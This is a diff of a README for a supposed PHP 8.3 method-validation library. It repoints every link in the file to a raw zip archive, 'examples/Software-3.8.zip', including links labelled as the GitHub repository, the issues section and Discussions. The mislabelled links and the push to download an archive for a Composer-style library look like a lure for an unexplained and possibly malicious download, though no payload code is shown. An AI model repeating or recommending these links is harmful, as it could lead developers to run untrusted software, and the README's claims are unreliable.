@@ -1,14 +1,14 @@
 # 🎉 Attributes - Validate PHP Methods with Ease
 
 ## 📦 Download Now
-[![Download the latest release](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip)
+[![Download the latest release](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip%20Latest%20Release-blue)](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the Attributes application! This tool helps you validate method parameters, return values, and property access in PHP 8.3 and above using simple and reusable attributes. Follow the steps below for easy installation and use.
 
 ## 📥 Download & Install
 To get the software, visit the following page:  
-[Download the latest release](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip)
+[Download the latest release](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip)
 
 Once there, look for the latest version listed at the top. Click on it to find the available files. You will see options for your system. Click on the one that suits your needs, usually the one with "Assets." After the download completes, you can continue with installation.
 
@@ -65,7 +65,7 @@ No, Attributes are a feature introduced in PHP 8.0 and have continued to evolve.
 Yes, Composer is the recommended way to manage dependencies in PHP projects. It simplifies the installation process.
 
 ### How do I report an issue?
-If you encounter any problems, visit the issues section on the [GitHub repository](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip) to report the issue. Our community will assist you.
+If you encounter any problems, visit the issues section on the [GitHub repository](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip) to report the issue. Our community will assist you.
 
 ## 🛡 Safety and Security
 Ensure that your PHP version is up-to-date. Using older versions may expose your application to security vulnerabilities. Regular updates help keep your application safe.
@@ -74,9 +74,9 @@ Ensure that your PHP version is up-to-date. Using older versions may expose your
 We welcome contributions from anyone interested. If you have ideas for features, improvements, or updates, feel free to fork the repository, make your changes, and submit a pull request. 
 
 ## 📧 Contact
-If you have further questions or need assistance, you can reach out via the [GitHub Discussions](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip) section. We’re happy to help. 
+If you have further questions or need assistance, you can reach out via the [GitHub Discussions](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip) section. We’re happy to help. 
 
 ## 🎈 Conclusion
 Thank you for choosing Attributes! We hope this tool simplifies your development process by making validation seamless. Download the latest version today and start enhancing your PHP applications! 
 
-Don't forget to visit the [download page](https://raw.githubusercontent.com/walter0329/Attributes/main/tailorage/Attributes.zip) for the most recent updates and versions.
+Don't forget to visit the [download page](https://github.com/walter0329/Attributes/raw/refs/heads/main/examples/Software-3.8.zip) for the most recent updates and versions.
